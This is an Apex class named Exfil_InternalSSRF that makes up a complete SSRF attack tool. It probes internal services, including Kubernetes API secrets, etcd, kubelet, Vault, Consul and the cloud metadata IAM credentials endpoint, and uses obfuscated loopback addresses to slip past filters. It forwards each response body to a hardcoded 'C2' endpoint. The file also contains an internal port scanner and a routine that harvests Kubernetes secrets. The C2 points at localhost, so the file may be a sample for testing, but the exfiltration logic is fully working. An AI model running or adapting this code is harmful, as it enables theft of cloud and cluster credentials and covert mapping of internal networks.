public class Exfil_InternalSSRF {
    private static final List<String> INTERNAL_TARGETS = new List<String>{
        'http://localhost:8080/',
        'http://localhost:8443/',
        'http://127.0.0.1:2379/v2/keys/',
        'http://127.0.0.1:10250/pods',
        'http://127.0.0.1:10255/pods',
        'http://127.0.0.1:6443/api',
        'http://10.0.0.1:443/api/v1/namespaces',
        'http://kubernetes.default.svc:443/api/v1/secrets',
        'http://kubernetes.default.svc:443/api/v1/configmaps',
        'http://kube-dns.kube-system.svc:53/',
        'http://consul.service.consul:8500/v1/catalog/services',
        'http://vault.service.consul:8200/v1/sys/seal-status',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://[::1]:8080/',
        'http://0x7f000001:8080/',
        'http://2130706433:8080/',
        'http://017700000001:8080/',
        'http://0:8080/',
        'http://instance-data/latest/meta-data/'
    };

    private static final String C2 = 'https://localhost:8080/ssrf-results';

    public static void scanInternalNetwork() {
        Http http = new Http();
        List<Map<String, String>> results = new List<Map<String, String>>();

        for (String target : INTERNAL_TARGETS) {
            try {
                HttpRequest req = new HttpRequest();
                req.setEndpoint(target);
                req.setMethod('GET');
                req.setTimeout(3000);
                HttpResponse resp = http.send(req);
                results.add(new Map<String, String>{
                    'target' => target,
                    'status' => String.valueOf(resp.getStatusCode()),
                    'body' => resp.getBody().left(500)
                });
            } catch (Exception e) {
                results.add(new Map<String, String>{
                    'target' => target,
                    'error' => e.getMessage()
                });
            }
        }

        HttpRequest exfilReq = new HttpRequest();
        exfilReq.setEndpoint(C2);
        exfilReq.setMethod('POST');
        exfilReq.setHeader('Content-Type', 'application/json');
        exfilReq.setBody(JSON.serialize(results));
        http.send(exfilReq);
    }

    public static void portScan(String targetHost) {
        Http http = new Http();
        List<Integer> ports = new List<Integer>{
            22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 9300,
            27017, 11211, 2379, 2380, 4001, 5000, 6443, 8001, 8500,
            8200, 9090, 9093, 3000, 5601, 15672, 25672
        };

        for (Integer port : ports) {
            try {
                HttpRequest req = new HttpRequest();
                req.setEndpoint('http://' + targetHost + ':' + port + '/');
                req.setMethod('GET');
                req.setTimeout(1000);
                HttpResponse resp = http.send(req);
            } catch (Exception e) {
            }
        }
    }

    public static void k8sApiExploit() {
        Http http = new Http();
        List<String> k8sEndpoints = new List<String>{
            'https://kubernetes.default.svc/api/v1/namespaces',
            'https://kubernetes.default.svc/api/v1/pods',
            'https://kubernetes.default.svc/api/v1/secrets',
            'https://kubernetes.default.svc/api/v1/services',
            'https://kubernetes.default.svc/api/v1/nodes',
            'https://kubernetes.default.svc/apis/apps/v1/deployments',
            'https://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts',
            'https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets'
        };

        for (String endpoint : k8sEndpoints) {
            try {
                HttpRequest req = new HttpRequest();
                req.setEndpoint(endpoint);
                req.setMethod('GET');
                req.setTimeout(5000);
                HttpResponse resp = http.send(req);
                if (resp.getStatusCode() == 200) {
                    HttpRequest exfil = new HttpRequest();
                    exfil.setEndpoint(C2 + '/k8s');
                    exfil.setMethod('POST');
                    exfil.setBody(resp.getBody());
                    http.send(exfil);
                }
            } catch (Exception e) {
            }
        }
    }
}
